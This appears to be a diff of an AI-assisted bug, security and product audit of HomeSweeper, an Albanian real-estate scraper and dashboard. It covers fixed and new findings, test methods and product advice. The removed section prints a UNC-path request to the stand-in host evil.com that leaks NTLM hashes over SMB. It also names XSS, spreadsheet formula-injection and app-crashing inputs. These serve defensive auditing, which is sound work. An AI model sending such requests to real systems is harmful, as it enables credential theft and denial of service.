@@ -1,336 +1,305 @@
-HOMESWEEPER - FULL BUG, SECURITY AND PRODUCT AUDIT
-Date: 2026-11-10, branch dev (last commit c113f86)
-Nothing in the repo was changed during this audit. All tests ran on copies of the DB.
+HOMESWEEPER - BUG, SECURITY AND PRODUCT AUDIT
+Re-audited 2026-11-13 on branch dev (last commit 5d5556b, favourites).
+First audit 2026-11-10 (commit c113f86); browser addendum 2026-11-12. This file replaces both.
+Nothing in the repo was changed by this re-audit. All tests ran on copies of the DB; the live scraper
+test saved nothing.
 
-For a new coding session: read this file, then the "Bug list" in NOTES.md. The fixes for #1-#3
-below are small and the ones for #2 and #3 were already tested (code is included here).
-
-=====================================================================================
-HOW IT WAS TESTED
-=====================================================================================
-- Read every source file and ran pyflakes over all of it.
-- Ran the real Scraper.Server app twice on other ports (8765/8766), pointed at copies of the DB:
-    a) the real 220 listings + 3 hostile listings (XSS, Excel formulas, rich markup, control chars,
-       40,000-char title, 300 photos, 300 tags)
-    b) 20,000 listings (the real ones multiplied)
-  The scrape engine was replaced with a fake one, so no live site was hit.
-- Security probes (Host/Origin/CSRF/CORS, path traversal incl. Windows backslashes, headers),
-  API fuzzing, a race test (16 threads, 11,455 play/pause/interval requests), Playwright UI tests
-  (XSS, console/CSP errors, phone width, speed at 20k), fuzzing of Derive/Search/scraper helpers,
-  Excel benchmarks.
-- One live HEADLESS turn of 2 listings per site (nothing saved to the DB).
-
-Test scripts were in the session scratchpad (temporary, may be deleted):
-  C:\Users\mezin\AppData\Local\Temp\claude\dd1e7efd1d97eb82\a4dbc6b4-c6d2-456e-851d-5d55650a96bf\scratchpad\
-  harness.py (runs Server with a fake engine on a test DB), seed.py (hostile + 20k DBs), fuzz.py,
-  race.py, ui_test.py, ui_perf.py, excel_bench.py, excel_fix_check.py
-  They are a good starting point for a pytest suite.
+For a new coding session: read SUMMARY, then NEW FINDINGS, then the "Bug list" in NOTES.md.
+Finding numbers are kept from the first audit (#1-#5, B1-B16, W1-W6); new ones are N1-N10.
 
 =====================================================================================
-CRITICAL
+SUMMARY
+=====================================================================================
+Fixed since 2026-11-10 and re-verified today:
+  #1 (critical, UNC/SMB paths), #2 (quadratic Excel), #3 (quadratic regex), B5 (AI cap ledger),
+  the 500s on huge ids and posted_within_days, Duashpi split_location(","), gallery safeUrl(),
+  strict request types, utf8_output() in the scrapers' __main__, "Njoftime" in the header,
+  phone numbers out of the scraper logs, pyflakes clean.
+New and most important:
+  N1 HIGH  one listing with a very long number in its "Kati"/"Banjo" tag takes the dashboard,
+           the AI search and the blocked list down (500 on every request) until the row is deleted.
+  N2 HIGH  "Jo agjenci" / "Person privat" keeps 0 of 178 MerrJep and 0 of 105 Njoftime listings.
+           B2 is answered: MerrJep's private sellers are tagged "Person fizik", which nothing maps.
+  N3 MED   rentals stored as sales (5 whose own title says "me qira"), 20 "sales" under 5.000 €.
+  N4 MED   every heart click throws the whole listings cache away (+2.5 s on the next load at 20k).
+Still open: #4 (sending every listing to the browser), B6, B8, B9, B10-B13, B15, B16, the data
+sanity items, no tests / CI / requirements.txt, state in memory, the version string.
+
+=====================================================================================
+HOW IT WAS TESTED (2026-11-13)
+=====================================================================================
+- Read every file changed since the first audit (Server.py, DB.py, the favourites UI, the scrapers'
+  browser code) and re-read the code behind every open finding.
+- Static: pyflakes (clean), compileall, importing all 17 modules, node --check on app.js and
+  favourites.js, packaging.version on the version string.
+- In-process API checks (FastAPI TestClient, 90 checks) on a copy of the real DB plus 3 hostile
+  listings: every #1-#3 / B5 / LOW fix, path traversal, Host/Origin/CORS, the new /api/favourite
+  endpoint (set/unset, idempotent, 404/422/403 cases, survives a re-scrape, cache refresh), the
+  /favourites page, blocking a hearted seller, and the favourite-column migration on an old-schema DB.
+- The real uvicorn server (fake scrape engine, no live sites) on two DB copies:
+    a) real listings + hostile ones: raw-socket UNC test, play/pause race test (16 threads,
+       11,090 requests), favourites race (12 writer + 4 reader threads for 15 s)
+    b) 20,000 listings: API, AI search, Excel and memory timings
+- Playwright (Chromium): XSS on the dashboard AND the favourites page, console/CSP errors, the
+  heart -> favourites page -> un-heart -> reload flow, sorts and search on the favourites page,
+  phone width (375 px), speed at 20k.
+- Fuzzing of Derive / Search / all four scrapers' pure helpers (4,000 random listings, long
+  adversarial strings) plus known-answer cases for every open data bug.
+- One live HEADLESS turn of 2 new listings per site with the installed Chrome (nothing saved).
+
+Test scripts (temporary scratchpad, may be deleted; a good start for a pytest suite):
+  C:\Users\mezin\AppData\Local\Temp\claude\dd1e7efd1d97eb82\6cbc8336-c1a8-45ed-8280-fe57663d34c1\scratchpad\
+  seed.py (test DBs), checks.py (API + fixes + favourites), harness.py (real server, fake engine),
+  scale.py (20k timings), race.py, fuzz.py, bigint.py (N1), ui_test.py, live.py
+
+=====================================================================================
+STATUS OF THE 2026-11-10 FINDINGS
+=====================================================================================
+FIXED (re-verified today)
+  #1  UNC / drive / NUL paths: 404 in ~1 ms on a real uvicorn (/%5c%5c10.255.255.1%5cs%5cx was 42 s).
+      Also covers /favourites%5c..%5c..%5cData. UI and API still served normally.
+  #2  Excel: 5,000 rows in 5.1 s; the full 20,000-listing export in 8.8 s (was > 5 min).
+      "=..." text is still stored as text, never as a formula.
+  #3  CENTER_TAG / CENTER_DISTANCE: 200,000 digits in 0.04 s, same matches as before.
+  B5  AI cap: failed paid calls are counted, deleting history doesn't reset it, over the cap -> 429
+      before any paid call.
+  LOW ids above 2^63 -> 422; posted_within_days 1e6 and -1e30 -> 200; interval_minutes true / "5" / 5.0
+      -> 422; split_location(",") -> (None, None); gallery uses safeUrl(); every scraper __main__ calls
+      utf8_output(); header names all four sites; pyflakes clean.
+  Logs: the scrapers print "found"/"Not available" instead of phone numbers; MerrJep no longer dumps
+      each listing's JSON.
+
+STILL OPEN (details under STILL OPEN below)
+  #4 scale; #5/B2 -> replaced by N2; B6; B8; B9; B10; B11; B12; B13; B15; B16; data sanity
+  (sale at 750 €, "Shitet në ankand", condition wording); Search.searchable_text crashes on a
+  non-string phone; "kati -1" not read; "Ina FutureHome" still counts as private; no request body
+  size limit; time picker format follows the browser locale; version string; no tests/CI/requirements.
+
+=====================================================================================
+NEW FINDINGS
 =====================================================================================
 
-#1  Any website can make HomeSweeper open a network (SMB) connection to a server it picks
-    Where: Scraper/Server.py, the static mount at the end: app.mount("/", StaticFiles(...))
-    What:  On Windows, a URL like  /%5c%5cevil.com%5cshare%5cx  becomes  \\evil.com\share\x.
-           Starlette's StaticFiles does os.path.join(UI_DIR, path) (which returns the UNC path,
-           dropping UI_DIR) and then os.path.realpath() on it BEFORE its "inside the folder" check.
-           realpath opens the path, so Windows connects over SMB to evil.com and can send the
-           agent's NTLM password hash. A plain <img src="http://127.0.0.1:8000/%5c%5cevil.com%5cx">
-           on any website the agent visits is enough: a GET passes the Host check (Host is 127.0.0.1).
-    Also a DoS: each request holds a worker thread ~40 s; 45 of them froze every API call for ~40 s.
-    Evidence: normal 404 = 0.003 s; UNC to 127.0.0.1 = 2.1 s; UNC to unroutable 10.255.255.1 = 42 s.
-              Server log: FileNotFoundError [WinError 53] The network path was not found:
-              '\\\\10.255.255.35\\s\\x'
-    Fix:   a middleware (or a StaticFiles subclass overriding get_path) that answers 404 for any
-           request path containing "\", ":" or a NUL byte, before the static mount sees it. Example:
+N1  HIGH  One listing can take the dashboard, the AI search and the blocked list down
+    Where: Scraper/Derive.py first_int() (line ~137), called by derive() for the "Kati",
+           "Kati (Numri i kateve)", "Banjo" and "Tualete" tags; with_derived() (line ~249) has no guard.
+    What:  first_int() does int() on the first run of digits. Python refuses int() on more than
+           4,300 digits (ValueError). derive() runs for every listing whenever the listings cache is
+           rebuilt, so one such tag makes every rebuild fail.
+    Evidence (DB copy + one listing with {"Kati": "1" x 5000}):
+           GET /api/listings 500, POST /api/ai/search 500, GET /api/blocked 500, and they stay 500
+           (the cache is never filled). The dashboard and the AI page are empty for that agent, and
+           every agent who scraped the same listing gets the same. Agents can't delete the row.
+    Caveat: not verified whether any site lets a seller type 4,300+ digits into a floor/bathroom
+           field (Njoftime's fields are free text typed by the seller, and nothing caps them).
+    Fix:   (a) first_int: read at most a few digits, e.g. re.search(r"-?\d{1,4}", ...), or catch
+               ValueError and return None.
+           (b) Defence in depth: in with_derived(), wrap derive() per listing (try/except -> log it and
+               use derived = {}), so no future bug in one listing can blank the whole app.
+           Retest: bigint.py must give 200 on all three endpoints.
 
-             @app.middleware("http")
-             async def no_windows_paths(request, call_next):
-                 path = request.url.path
-                 if "\\" in path or ":" in path or "\x00" in path:
-                     return JSONResponse({"detail": "Not Found"}, status_code=404)
-                 return await call_next(request)
+N2  HIGH  "Jo agjenci" / "Person privat" drops every private seller on MerrJep and Njoftime
+    Where: MerrJep_al/PlaywrightScraper1.py ATTRIBUTE_COLUMNS ("Njoftim nga" -> posted_by, line 38);
+           njoftime_al/PlaywrightScraper3.py line ~541 (posted_by = "Kompani" or None);
+           Scraper/Derive.py posted_by_of() (line ~206, only Duashpi gets "Person privat" for empty).
+    What:  This answers B2. MerrJep's own tag tells the two apart: 176 listings say "Kompani" and 2 say
+           "Person fizik" ("Bleona", and MerrJep's own sandbox test listing). So the "Kompani" values
+           are right, but "Person fizik" is stored as-is and isn't one of the shared values
+           (Search.POSTED_BY = "Kompani", "Person privat"). Njoftime marks only agencies and leaves
+           private sellers empty, and Derive doesn't fill them in like it does for Duashpi.
+    Evidence (real DB copy):
+           AI posted_by = Person privat keeps: merrjep 0/178, njoftime 0/105, duashpi 35/105,
+           gazetacelesi 50/105.
+           Dashboard "Postuar nga": MerrJep shows a separate "Person fizik" option; Njoftime's 14
+           private listings have no value, so ticking "Person privat" hides them.
+    Why it matters: finding private sellers is the main reason agents buy this.
+    Fix:   map "Person fizik" -> "Person privat" in the MerrJep scraper (the shared-wording rule) or in
+           Derive; in posted_by_of(), treat empty as "Person privat" for njoftime too (same reason as
+           Duashpi). Saved rows are corrected by Derive at read time, so no re-scrape is needed if it's
+           done there. Also see #5: "Ina FutureHome" still passes Njoftime's name check as private.
 
-           Retest: GET /%5c%5c10.255.255.1%5cs%5cx must answer 404 in milliseconds.
-           Also fixes the 500 on "/app.js%00.html" (null byte).
+N3  MEDIUM  Rentals stored as sales, and impossible sale prices
+    Where: each scraper's listing_type mapping; Derive.derive() only sanity-checks rents (RENT_EUR_RANGE).
+    Evidence (real DB, 493 listings):
+      - Titles that say rent, stored as "Shitet": 4 on MerrJep ("JEPET ME QIRA APARTAMENT 2+1 - DON
+        BOSKO" 750 €, "Apartament 2+1 me qira - 400 euro", "JEPET ME QERA ... 3+1" 500 ALL,
+        "JEPET ME QERA 1+1+BALLKON ... 500 EURO"), 1 on Gazeta ("Jepet apartament me qera 3+1+2" 85.000 ALL).
+      - 20 "sales" under 5.000 € (or 500.000 ALL), e.g. a villa at 5 €, an apartment at 175 ALL,
+        five "Shitet apartament" at 2.700 €.
+      - MerrJep's own test listing is stored as a real one ("Apartamente prej 80m2 test private",
+        seller "Merrjep Sandbox Private Seller", upid 9837964).
+    Effect: rent searches miss these, and "cheapest sales" starts with rentals and typos.
+    Fix:   treat a sale under ~5.000 € like the rent check does (no price for filters/sorts), and flag
+           a "Shitet" whose title says "jepet / me qira / me qera" (or let the title win). Skip sellers
+           named "Sandbox" / titles with "test private" on MerrJep.
 
-#2  The Excel export becomes unusable after a few thousand listings (quadratic)
-    Where: Scraper/Output.py, append_row() (around line 95)
-    What:  after each sheet.append() it reads sheet[sheet.max_row]; openpyxl's max_row/max_column
-           scan every cell, so building the workbook is O(rows^2).
-    Evidence: build_workbook 500 rows 1.2 s, 2,000 rows 29 s, 5,000 rows 63 s, 20,000 rows > 5 min
-              (the UI download never finished). The per-turn Output/listings.xlsx (save_listings,
-              called 4x per turn) took 5.1 s to append 50 rows to a 5,000-row file, and keeps growing.
-    Fix (tested: 20,000 rows in 7.9 s, formula injection still blocked):
+N4  MEDIUM (at 20k listings)  Every heart click rebuilds the whole listings cache
+    Where: Scraper/Server.py api_favourite() -> forget_cached_listings() (line ~104 / ~596).
+    What:  correct (tested: the change shows at once, API == DB after 343 parallel writes), but it
+           throws away the derived copy of every listing. The next /api/listings, AI search or
+           blocked-list request re-reads and re-derives all of them while holding LISTINGS_LOCK, so
+           every other request waits.
+    Evidence at 20,000 listings: /api/listings 2.4 s cached -> 4.9 s right after one heart click.
+           Unnoticeable at today's ~500 listings.
+    Fix:   under LISTINGS_LOCK, set listing["favourite"] on the cached dict instead of dropping the
+           cache (set_favourite already committed it).
 
-             def append_row(sheet, values):
-                 sheet.append(values)
-                 row = sheet._current_row  #The row append() just wrote, no scan of the sheet
-                 for column, value in enumerate(values, start=1):
-                     if isinstance(value, str) and value.startswith("="):
-                         sheet.cell(row=row, column=column).data_type = "s"
+N5  LOW  The favourites page downloads every listing to show the favourites
+    Where: UI/favourites.js loadFavourites() fetches /api/listings and filters favourite == true.
+    Evidence: 20k listings, 20 favourites: 44 MB JSON (10 MB gzipped), 3.6 s before the 20 cards show.
+    Fix:   with #4: /api/listings?favourite=1 (or the slim list endpoint).
 
-           Also decide whether the per-turn Output/listings.xlsx is still needed (NOTES to-do 9);
-           it loads the whole growing file 4 times per turn.
+N6  LOW  Two more quadratic regexes (same shape as #3), on short inputs today
+    - njoftime_al/PlaywrightScraper3.py LEK_PRICE_PATTERN / EUR_PRICE_PATTERN (lines 111-112), run on
+      the thread title: 4,000 digits 0.25 s, 8,000 digits 1.0 s (x4 per doubling).
+    - Scraper/Derive.py PROPERTY_PATTERNS, the villa pattern "\d+ katesh" (line 61), run on the title and
+      Kategoria on every cache rebuild: 10,000 digits 0.18 s, 20,000 digits 0.72 s.
+    Titles on these sites are short, so neither is a problem today.
+    Fix:   the same lookbehind as #3: (?<![\d.,'])(\d[\d.,']*)... and (?<!\d)\d+ katesh.
 
+N7  LOW  The Excel export doesn't say which listings are favourites
+    Where: Scraper/Output.py BASE_COLUMNS / HEADERS. Add "favourite" with an Albanian header
+           (e.g. "E preferuar": Po/Jo). An "export only my favourites" option would also fit agents.
+
+N8  LOW (before Phase 4)  The first real schema migration doesn't use the planned versioning
+    Where: Scraper/DB.py create_tables() adds favourite by checking PRAGMA table_info.
+    Tested: it works on an old DB and running it twice is harmless. But PRAGMA user_version is still 0
+           and the DB isn't backed up first, which CLAUDE.md -> "Where files live" requires once agents
+           have real data. Fine in dev; switch to user_version + ordered steps + backup before shipping.
+
+N9  INFO  Small server details (harmless, noted so nobody re-investigates)
+    - The 404 from no_windows_paths, the 403 from the Origin check and the 400 from the Host check
+      carry no CSP / nosniff / no-cache headers (those middlewares sit outside no_stale_ui). The
+      bodies are JSON, so nothing renders.
+    - The Origin check compares host:port, not the scheme: https://127.0.0.1:8000 would pass, but
+      nothing can serve that origin (the server on 8000 is plain HTTP).
+    - HEAD /favourites and GET /favourites/ answer 404 (only GET /favourites is a route).
+
+N10 INFO  A .env file at the project root holds a key-like value
+    It is git-ignored, was never committed (0 key-like strings in the whole git history), and the app
+    doesn't read it (AI.py reads ANTHROPIC_API_KEY or Data/anthropic_api_key.txt). Make sure the
+    Phase 4 build and the update zip never include it.
+
+=====================================================================================
+STILL OPEN (carried over, re-checked today)
 =====================================================================================
 HIGH
-=====================================================================================
+#4  Sending every listing to the browser doesn't scale (measured again at 20,000 listings)
+    /api/listings       44.3 MB JSON (10.0 MB gzipped); 2.4 s cached, 4.9 s on a rebuild (see N4)
+    Browser             first cards 3.1 s (was 7.5 s); loadListings() after EVERY finished turn 2.9 s
+                        (was 4.8 s); a filter change render() 169 ms (fine)
+    Server memory       272 MB after loading, 680 MB after one Excel export (was 621 MB)
+    AI search           worst near-miss case 3.9 s (was 12.9 s); keyword + best_match 4.3 s (was 3.8 s):
+                        searchable_text() is still built for every listing on every search
+    Excel export        8.8 s (fixed by #2)
+    Fix (unchanged): slim list endpoint (card fields only) + /api/listings/{id} + ?since= for new rows
+    (REVIEW.md roadmap #10); cache searchable_text per listing in the listings cache; then N4 and N5.
 
-#3  One malicious listing can slow down every agent's app (quadratic regex)
-    Where: Scraper/Search.py CENTER_TAG (line ~35) and Scraper/Derive.py CENTER_DISTANCE (line ~125)
-    What:  \d+(?:[.,]\d+)?\s*k?m... restarts at every digit of a long digit run -> O(n^2).
-           Runs on every listing on every cache rebuild and every search. All agents scrape the same
-           public sites, so one seller posting a description full of digits hits everyone.
-    Evidence: 2,000 digits 0.09 s, 4,000 0.36 s, 8,000 1.44 s (x4 per doubling).
-    Fix (tested: 200,000 digits in 0.012 s, same matches on "2.4km nga qendra, 982m nga qendra"):
-           add a lookbehind so a match can't start in the middle of a number:
-             CENTER_TAG      = re.compile(r"(?<![\d.,])\d+(?:[.,]\d+)?\s*k?m\s+nga\s+qendra")
-             CENTER_DISTANCE = re.compile(r"(?<![\d.,])(\d+(?:[.,]\d+)?)\s*(km|m)\s+nga\s+qendra")
-
-#4  "Send every listing to the browser" doesn't scale (measured at 20,000 listings)
-    - /api/listings: 46 MB JSON (10 MB gzipped), 1.7-2.4 s on the server
-    - first cards in the browser after 7.5 s
-    - the UI freezes 4.8 s after EVERY finished turn (loadListings reloads everything)
-    - server process uses 621 MB RAM (157 MB with 220 listings)
-    - AI near-miss search (POST /api/ai/search, few results): 12.9 s
-      typical best_match search: 3.8 s
-      Cause: score() calls searchable_text() again for every listing in sort_listings("best_match"),
-      match_reasons() does it again, and near_misses ranks ALL candidates to return 12.
-    - With 5 blocked sellers, /api/listings went from 2.4 s to 4.6 s (phone_keys regex per listing per request)
-    Fix: slim list endpoint (card fields only) + /api/listings/{id} + ?since= for new rows
-         (REVIEW.md roadmap #10); cache searchable_text per listing in the listings cache; in
-         near_misses only rank what is returned. Agents will reach these sizes in weeks of
-         continuous scraping.
-    Note: the dashboard filters themselves are fine at 20k (render() 60-160 ms).
-
-#5  "Jo agjenci" / private-seller filter can't be trusted yet
-    - MerrJep: posted_by = "Kompani" on all 55 listings (bug B2, still open).
-    - Njoftime: 48 of 55 marked Kompani by the name/logo guess (mostly right on the data seen;
-      "Ina FutureHome" slips through as private because \bhomes?\b needs a word start).
-    For agents, finding private sellers is the main point of the product.
-
-=====================================================================================
 MEDIUM
-=====================================================================================
-- B5 (still open): deleting today's questions from Historia resets the $2/day AI cap; failed paid
-  calls (refusal, max_tokens, unreadable answer) are never counted.
-- B9 (still open): a fallback model's answer is priced at Opus 5.5 rates.
-  (Checked against the model reference: Opus 5.5 = $4 in / $20 out / $0.20 cache read per MTok,
-  cache write 1.25x = $5; effort "low", fallbacks "default" + beta server-side-fallback-2026-07-01
-  and json_schema output are all valid. So the constants in AI.py are correct.)
-- Data sanity:
-  - A MerrJep listing titled "JEPET ME QIRA APARTAMENT 2+1 ... DON BOSKO" is stored as listing_type
-    "Shitet" at 750 EUR. Nothing flags a sale under ~5,000 EUR (Derive only checks rents: RENT_EUR_RANGE).
-  - Gazeta "Shitet në ankand" (auction) is not in Search.LISTING_TYPES, so the AI's "Shitet" filter misses it.
-  - Condition wording still unmerged in the DB and Excel (I ri / E re / E rikonstruktuar / Ne gjendje te mire).
-  - Njoftime published_date = last refresh, not the posting date (known, documented).
-- Phone numbers and names printed in full to the console (MerrJep dumps the whole listing JSON).
-  Becomes stored personal data once Phase 4 writes log files (REVIEW.md #5).
-- Still no tests, no CI, no requirements.txt. Every bug above was found in minutes by fuzzing.
-- State still lives in memory (play/pause, break, agency preference, RESUME_PAGE...) - known, Phase 4.
+- B6   The server still needs the anthropic package to start (Server.py imports AI, AI imports
+       anthropic at the top). Import it inside question_to_filters().
+- B8   Scraper failures are still invisible: Engine/UI never read the scrapers' LAST_TURN.
+- B9   A fallback model's answer is still priced at Opus 5.5 rates (usage_of() ignores the model).
+- Data sanity (besides N3): "Shitet në ankand" (1 Gazeta listing) is not in Search.LISTING_TYPES, so
+       the AI's "Shitet" misses it; condition wording is still unmerged in the DB and Excel
+       (I ri 96, I përdorur - Si i ri 24, Ne gjendje te mire 18, I përdorur - Në gjendje të mirë 17,
+       E re 15, E rikonstruktuar 5, ...); Njoftime's published_date is the last refresh (known).
+- No tests, no CI, no requirements.txt. Every new finding above was found by a script in minutes.
+- State still lives in memory (play/pause, break, agency preference, RESUME_PAGE...) - Phase 4.
 
-=====================================================================================
 LOW
-=====================================================================================
-- 500 instead of 400/404 (unhandled exceptions):
-  - ids above 2^63: GET /api/ai/history/<id>, DELETE /api/ai/history/<id>, DELETE /api/blocked/<id>
-    -> OverflowError: Python int too large to convert to SQLite INTEGER (not a sqlite.Error, so not caught)
-  - POST /api/ai/search {"filters":{"posted_within_days":1000000}} -> OverflowError: date value out of range
-    (Search.failures: date.today() - timedelta(days=...)). Clamp it in the Filters validator (e.g. <= 36500).
-  - "/app.js%00.html" -> ValueError embedded null character (fixed by the #1 middleware)
-- Duashpi split_location(",") -> IndexError (parts is empty). Would fail that listing as "unexpected".
-- Search.searchable_text crashes (TypeError) if phone is not a string (can't happen from the DB today).
-- Basement floor "kati -1" is not read by Derive.floor_in_text.
-- B10 confirmed still open: MerrJep combine_phones("+355691234567", "0691234567") keeps both
-  (compares all digits; the other scrapers compare the last 9).
-- B11 confirmed still open: Duashpi parse_price("1.5 milion €") -> (1.5, "EUR").
-- B12 still open: "Mbledhja e fundit" shows only a time, no date.
-- UI/index.html line 18: header says "MerrJep, Gazeta Celësi dhe Duashpi" - Njoftime is missing.
-- UI/app.js line ~1025 (openGallery show()): main.src = images[current] skips safeUrl().
-  The CSP blocked the javascript: image in the test, but use safeUrl() like everywhere else.
-- The "Nis me orar" time picker shows "08:00 AM" (browser locale) instead of 24-hour time.
-- POST /api/auto/start {"interval_minutes": true} is accepted as 1 minute (pydantic lax mode;
-  use StrictInt or check the type).
-- The scrapers' __main__ blocks (python -m GazetaCelesi.PlaywrightScraper etc., listed in CLAUDE.md)
-  don't call utf8_output(), so they crash on emoji titles when output is redirected (cp1252).
-- No request body size limit (a 9 MB /api/ai/search body took 16 s at 20k listings; only our own
-  page can send it, so low risk).
-- pyflakes: Scraper/Version.py unused variable "Version"; Tools/Performance.py unused "import time".
-- Version string "1.0.0/11/2026" is not valid for packaging.version (known, NOTES "Versioning").
+- B10  MerrJep combine_phones("+355691234567", "0691234567") still keeps both numbers.
+- B11  Duashpi parse_price("1.5 milion €") -> 1.5 € (Njoftime's parse_price has the same gap).
+- B12  "Mbledhja e fundit" still shows only a time (UI/app.js line ~1236); the error tooltip still says
+       "Shiko konsolën e serverit" (line ~1235), and agents have no console.
+- B13  Docs drift: CLAUDE.md still describes MerrJep_al/Request1.py, GazetaCelesi/Request.py and
+       Duashpi_al/Request2.py, which don't exist.
+- B15  The per-turn Output/listings.xlsx still gets the scrapers' dicts (empty first/last seen columns).
+- B16  Unescaped error text in rich prints: Engine.py line ~62 ("scraper crashed"), Server.py line ~158
+       ("Scrape failed"); stale comments: Duashpi line 2 "click, read, go back", MerrJep line 23
+       "res et_state()".
+- Search.searchable_text raises TypeError when phone isn't a string (fuzz; can't happen from the DB today).
+- Derive.floor_in_text doesn't read a basement "kati -1".
+- Njoftime's agency name check lets "Ina FutureHome" through as private (\bhomes?\b needs a word start).
+- No request body size limit (unchanged, not re-measured; only our own page can POST).
+- The "Nis me orar" time picker is drawn in the browser's locale (AM/PM on an English Windows).
+- Version "1.0.0/11/2026" is still rejected by packaging.version; switch to "1.0.0" before the updater.
 
 =====================================================================================
-WHAT IS GOOD (verified, not assumed)
+BROWSER ADDENDUM (2026-11-12) - STATUS
 =====================================================================================
-- Host check, Origin check and no CORS blocked every DNS-rebinding and cross-site attempt:
-  foreign Host -> 400; POST with no/foreign/null/other-port Origin -> 403; no CORS headers on reads.
-- Normal path traversal blocked (../, %2e%2e, %2f, %5c..%5c all 404).
-- Security headers (CSP, nosniff, no-referrer, no-cache) on every response.
-- SQL is parameterised everywhere; no secrets in the git history; the key file is git-ignored.
-- No XSS: hostile titles/descriptions render as text, javascript: links become "#", CSP is a second layer.
-- Excel formula injection blocked ("=HYPERLINK...", "=cmd|..." stored as text, not formulas);
-  control characters stripped; cells cut at 32,767 chars.
-- Play/pause scheduler: 11,455 concurrent requests from 16 threads, never two turns at once,
-  clean state after pause, next turn scheduled correctly after the break.
-- The error-handling block is byte-identical in all four scrapers.
-- All four scrapers work HEADLESS today (first headless test for Duashpi and Njoftime):
-  MerrJep 2 in 20 s, Gazeta 2 in 7 s, Duashpi 2 in 22 s, Njoftime 2 in 11 s, all ended "ok", no blocks.
-- Dashboard filtering is fast at 20k listings; the phone layout (375 px) has no sideways scroll.
-- Albanian UI text is consistent; code is well documented.
-- Data: 0 duplicate UPIDs or URLs; 220 listings, 55 per site.
+W1 focus grab, W2 minimized window comes back, W3 off-screen position only proven on Windows:
+   decided by the owner on 2026-11-12: run real scrapes with Headless = True, which has none of these
+   and sends the same headers as the visible browser. config.py in the repo still has Headless = False.
+   Today's live test ran headless with the installed Chrome:
+     MerrJep 2 listings in 19.5 s, Gazeta 2 in 7.6 s, Duashpi 2 in 19.2 s, Njoftime 2 in 16.1 s;
+     all ended "ok", every field filled, no duplicates, no blocks or captchas.
+   Open question kept: the owner saw a minimized window stay down; repeat with the real minimize button.
+W4 still open: config.py has Window_Position = None (window on screen). Set (-2000, -2000) or
+   Headless = True before anyone else runs it.
+W5 unchanged: the Chrome fallback warning prints once per site per turn; managed/per-user/macOS Chrome
+   untested; run one short turn after a Playwright or major Chrome upgrade.
+W6 info: off-screen/minimized pages still report "visible"; no problem found.
+
+=====================================================================================
+WHAT IS GOOD (verified today)
+=====================================================================================
+- Host check, Origin check and no CORS still block every cross-site attempt, now including the new
+  POST /api/favourite (no / foreign / null / other-port Origin -> 403; foreign or look-alike Host -> 400).
+- Path traversal blocked (../, %2e%2e, %2f, %252e, %5c, .git/config) and #1 fixed.
+- The favourites feature is solid: strict input (id 0, -1, 2^63, text, true; favourite 1 / "true" ->
+  422), unknown id -> 404, idempotent, kept after a re-scrape, hidden with a blocked seller and back
+  after unblocking, correct under 12 parallel writers, the migration works on an old DB.
+- No XSS on the dashboard or the favourites page: hostile titles render as text, javascript: links
+  become "#", javascript: / data: photos are never loaded, no console or CSP errors on any page.
+- The heart flow works end to end in the browser (heart -> favourites page -> un-heart -> stays off
+  after a reload), the favourites search, no-match note, sorts and tabs work, and neither page scrolls
+  sideways at 375 px.
+- Play/pause scheduler: 11,090 requests from 16 threads, never two turns at once, clean state after
+  pause, exactly one turn and the next one 60 s after it.
+- The error-handling block (139 lines) and the browser launch helpers are byte-identical in all four
+  scrapers; all four scrape headless today.
+- Excel formula injection blocked; SQL parameterised everywhere; no secrets in git; data has 0 duplicate
+  UPIDs or URLs (493 listings: MerrJep 178, Gazeta / Duashpi / Njoftime 105 each).
 
 =====================================================================================
 PRODUCT ASSESSMENT
 =====================================================================================
 As a customer (real estate agent):
-- Real value: four sites in one place, phone numbers, Albanian AI search, block sellers, Excel.
+- Real value: four sites in one place, phone numbers, Albanian AI search, blocked sellers, Excel,
+  and now favourites, which agents will use daily.
 - Friction:
-  - Tall cards in a sideways strip show ~3 listings per screen (REVIEW.md #14: grid + compact card).
-  - On a phone the header takes ~250 px; the first listing is below the fold.
+  - "Jo agjenci" silently hides every private seller on two of the four sites (N2).
+  - On a phone the first listing starts at 703 px of a 740 px screen on the dashboard (the favourites
+    page does better: 351 px).
   - Operator controls (break, schedule, agency preference) sit in the agent's face (REVIEW.md #15).
-  - The AI setup note tells agents to edit Data/anthropic_api_key.txt - not for non-technical users.
-  - Errors say "Shiko konsolën e serverit" - agents have no console.
-  - "Mbledhja e fundit" shows only a time.
-- What agents would pay more for: "new since yesterday" alerts, price-drop tracking,
-  merging the same flat posted on several sites, export of the filtered set only.
+  - The AI setup note tells agents to edit Data/anthropic_api_key.txt; errors say "Shiko konsolën e
+    serverit"; "Mbledhja e fundit" has no date.
+- What agents would pay more for: "new since yesterday" alerts, price-drop tracking, merging the same
+  flat posted on several sites, export of the filtered set or of the favourites only.
 
-As a business:
-- Agents in one office share one public IP. Five copies scraping the same four sites from one IP
-  is the most likely way to get blocked. Stagger them, or plan a central scraper later.
-- Legal check needed: storing private sellers' names and phone numbers falls under Albania's
-  personal data protection law; each site has its own terms of use.
+As a business (unchanged):
+- Agents in one office share one public IP; several copies scraping the same sites from one IP is the
+  most likely way to get blocked. Stagger them, or plan a central scraper later.
+- Legal check needed: storing private sellers' names and phone numbers falls under Albania's personal
+  data protection law; each site has its own terms of use.
 - AI cost: worst case ~$60 per agent per month at the $2/day cap. Build it into the price.
 - Still undecided: the AI needs a key and contacts Anthropic, which contradicts "nothing phones home"
   and "no licence keys" in CLAUDE.md -> Product architecture.
 - Owner installs on every PC: fine for ~20 agents, doesn't scale beyond that (code signing then needed).
 
 As an engineer / QA:
-- Scraper code copied four times (~560 lines each); app.js over 2,000 lines; all scraper state in
-  module globals; everything derived at read time.
-- No automated tests - every bug above would only be found by hand.
+- Scraper code still copied four times (~560-790 lines each); app.js 2,145 lines; all scraper state in
+  module globals; everything derived at read time (which is why N1 and #4 hit every request).
+- Still no automated tests.
 
 =====================================================================================
 SUGGESTED ORDER
 =====================================================================================
-1. Fix #1 (UNC path middleware), #2 (Excel append_row) and #3 (regex lookbehind). Small, fixes above.
-2. Resolve B2 (MerrJep "Kompani" on everything).
-3. Input guards for the 500s (big ids, posted_within_days, split_location) + the sale/rent sanity check
-   + add "Shitet në ankand" handling.
-4. Turn the test scripts into a pytest suite (Derive/Search fuzz, API security checks, race test).
-5. Slim list endpoint + incremental loading (?since=) before agents reach ~5k listings.
-6. Add the new findings to the Bug list in NOTES.md.
-
-
-=====================================================================================
-ADDENDUM 2026-11-12: THE SCRAPER BROWSER (INSTALLED CHROME vs PLAYWRIGHT CHROMIUM) AND ITS WINDOW
-=====================================================================================
